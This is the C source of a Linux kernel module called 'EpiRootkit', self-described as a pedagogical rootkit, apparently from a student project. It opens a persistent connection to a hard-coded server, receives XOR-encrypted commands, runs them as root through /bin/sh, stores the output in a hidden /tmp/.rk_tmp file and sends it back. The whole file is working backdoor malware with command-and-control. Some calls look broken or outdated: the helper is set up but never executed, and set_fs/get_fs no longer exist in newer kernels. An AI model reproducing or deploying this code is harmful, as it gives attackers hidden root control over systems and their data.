// filepath: c:\\Users\\Admin\\Documents\\GitHub\\epizut\\rootkit\\epirootkit.c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/uaccess.h>
#include <linux/ctype.h>
#include <linux/spinlock.h>
#include <linux/list.h>
#include <linux/version.h>
#include <linux/cred.h>
#include <linux/namei.h>
#include <linux/inet.h>
#include <net/sock.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Team_Rodrien");
MODULE_DESCRIPTION("EpiRootkit - A pedagogical rootkit");
MODULE_VERSION("0.3");

static struct rootkit_config {
    unsigned short port;
    char server_ip[16];
    size_t buffer_size;
    char xor_key[32];
} config = {
    .port = 4242,
    .server_ip = "192.168.15.6",
    .buffer_size = 2048,
    .xor_key = "epirootkit"
};

static struct socket *g_sock = NULL;
static struct task_struct *g_thread = NULL;

static void xor_cipher(char *data, size_t len) {
    size_t key_len = strlen(config.xor_key);
    for (size_t i = 0; i < len; i++)
        data[i] ^= config.xor_key[i % key_len];
}

static int send_data(const char *msg, size_t len) {
    struct msghdr msg_hdr = { 0 };
    struct kvec iov = { .iov_base = (char *)msg, .iov_len = len };
    return kernel_sendmsg(g_sock, &msg_hdr, &iov, 1, len);
}

static int receive_data(char *buf, size_t len) {
    struct msghdr msg_hdr = { 0 };
    struct kvec iov = { .iov_base = buf, .iov_len = len };
    return kernel_recvmsg(g_sock, &msg_hdr, &iov, 1, len, 0);
}

static int command_loop(void *data) {
    char *buf = kmalloc(config.buffer_size, GFP_KERNEL);
    if (!buf) return -ENOMEM;

    while (!kthread_should_stop()) {
        memset(buf, 0, config.buffer_size);
        int ret = receive_data(buf, config.buffer_size - 1);
        if (ret <= 0) {
            msleep(3000);
            continue;
        }

        xor_cipher(buf, ret);
        if (strncmp(buf, "exec:", 5) == 0) {
            struct file *fp;
            mm_segment_t old_fs;
            char *cmd = buf + 5;
            char output[2048] = {0};
            snprintf(output, sizeof(output), "/bin/sh -c '%s' > /tmp/.rk_tmp 2>&1", cmd);
            call_usermodehelper_setup("/bin/sh", (char *[]) {"sh", "-c", output, NULL}, NULL, GFP_KERNEL);
            old_fs = get_fs();
            set_fs(KERNEL_DS);
            fp = filp_open("/tmp/.rk_tmp", O_RDONLY, 0);
            if (!IS_ERR(fp)) {
                ret = kernel_read(fp, output, sizeof(output) - 1, &fp->f_pos);
                filp_close(fp, NULL);
                xor_cipher(output, ret);
                send_data(output, ret);
            }
            set_fs(old_fs);
        }
    }

    kfree(buf);
    return 0;
}

static int connect_to_server(void) {
    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(config.port),
        .sin_addr.s_addr = in_aton(config.server_ip)
    };

    int ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &g_sock);
    if (ret < 0) return ret;

    while ((ret = g_sock->ops->connect(g_sock, (struct sockaddr *)&addr, sizeof(addr), 0)) < 0) {
        msleep(3000);
    }

    return 0;
}

static int __init rk_init(void) {
    int ret = connect_to_server();
    if (ret < 0) return ret;

    g_thread = kthread_run(command_loop, NULL, "rk_cmd_thread");
    if (IS_ERR(g_thread)) return PTR_ERR(g_thread);

    return 0;
}

static void __exit rk_exit(void) {
    if (g_thread) kthread_stop(g_thread);
    if (g_sock) sock_release(g_sock);
}

module_init(rk_init);
module_exit(rk_exit);
